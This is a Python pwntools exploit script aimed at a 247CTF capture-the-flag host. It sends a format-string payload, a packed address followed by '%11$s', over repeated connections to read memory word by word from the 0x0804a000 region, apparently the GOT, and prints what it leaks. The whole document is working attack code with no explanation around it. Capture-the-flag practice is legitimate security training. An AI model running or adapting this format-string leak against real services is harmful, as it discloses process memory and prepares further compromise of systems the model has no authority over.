#!/usr/bin/env python3
from pwn import *
import struct

HOST = "bfd8e45c553fd640.247ctf.com"
PORT = 50092

context.log_level = "error"

def leak(addr):
    r = remote(HOST, PORT, timeout=5)
    r.recvuntil(b"again?\n")
    payload = struct.pack("<I", addr) + b"%11$sXXX"
    r.sendline(payload)
    data = r.recvuntil(b"XXX")
    r.close()
    # data format: b"Oh, .. back " + inserted bytes + leaked + "XXX"
    # remove prefix up to inserted pointer (4 bytes)
    leak_part = data.split(struct.pack("<I", addr))[1]
    leak_part = leak_part[:-3]  # remove b"XXX"
    return leak_part

for i in range(0, 0x60, 4):
    addr = 0x0804a000 + i
    try:
        leak_bytes = leak(addr)
    except Exception as e:
        print(hex(addr), "error", e)
        continue
    if len(leak_bytes) == 0:
        print(hex(addr), "->", "<empty>")
        continue
    print(hex(addr), "->", leak_bytes[:4][::-1].hex(), leak_bytes[:4].hex())
